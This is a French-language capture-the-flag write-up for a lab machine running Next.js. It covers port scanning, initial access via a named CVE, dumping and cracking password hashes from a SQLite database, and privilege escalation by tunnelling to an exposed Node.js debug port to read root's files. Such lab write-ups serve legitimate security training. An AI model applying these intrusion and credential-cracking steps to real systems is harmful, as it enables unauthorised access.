# User Flag
```bash
nmap -sV -sC 10.129.61.156
```
On obtient deux ports utilisés :
    20: ssh
    3000: unknown, mais renvoie :
```
(GetRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x20Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nCache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017175\r\nDate:\x20Sun,\x2013\x20Sep\x202026\x2015:32:36\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.js\"\x20async=\"\"></script><script\x20s")
(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
(NCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
(HTTPOptions,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Sun,\x2013\x20Sep\x202026\x2015:32:36\x20GMT\r\nConnection:\x20close\r\n\r\n")
(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Sun,\x2013\x20Sep\x202026\x2015:32:36\x20GMT\r\nConnection:\x20close\r\n\r\n")
(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
```
On voit que le port 3000 est un service *Next.js*, et possède une CVE associée : CVE-2025-55182.

On obtient l'accès à une session `node`, qui peut lire `/etc/passwd` :
```
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
node:x:999:988::/home/node:/usr/sbin/nologin
```

Dans la session node, on trouve une database, que l'on ouvre avec SQLite3 :
```bash
sqlite3 reactor.db .dump
```
Dans la DB, on trouve deux hashs de mdp :
```
admin:a203b22191d744a4e70ada5c101b17b8
engineer:39d97110eafe2a9a68639812cd271e8e
```
Avec un crack de mdp (john), on obtient :
```bash
john ...
# engineer:reactor1
```

# Root Flag
Avec `uid`, on voit que engineer appartient au groupe [[LxD]], qui peut être un vecteur de PE. On n'aboutit pas sur cette piste.

Port ouverts : 9229, port de debug de Node.js
```bash
curl http://127.0.0.1:9229/json/list
```
Et renvoie entre autres :
```
devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/d4014d04-771a-4f2f-bf88-1d2d6eea3588
```

Création d'un tunnel SSH :
```bash
ssh -L -N 4444:localhost:9229 engineer@10.10....
```
Configuration du port 4444
Lancement de DevTools sur Chrome et de la console

Utilisation de commandes JS dans la console DevTools :
``` bash
$ require('os').hostname()
'reactor'
$ process.cwd()
'/'
$ require('fs').readdirSync('.')
(25) ['bin', 'bin.usr-is-merged', 'boot', 'cdrom', 'dev', 'etc', 'home', 'lib', 'lib.usr-is-merged', 'lib64', 'lost+found', 'media', 'mnt', 'opt', 'proc', 'root', 'run', 'sbin', 'sbin.usr-is-merged', 'snap', 'srv', 'sys', 'tmp', 'usr', 'var']
$ require('fs').readdirSync('root')
(10) ['.bash_history', '.bashrc', '.cache', '.config', '.lesshst', '.local', '.npm', '.profile', '.ssh', 'root.txt']
$ require('fs').readFileSync('root/root.txt', 'utf8')
'e7597cacb097022c71cf8af5e1b42170\n'
```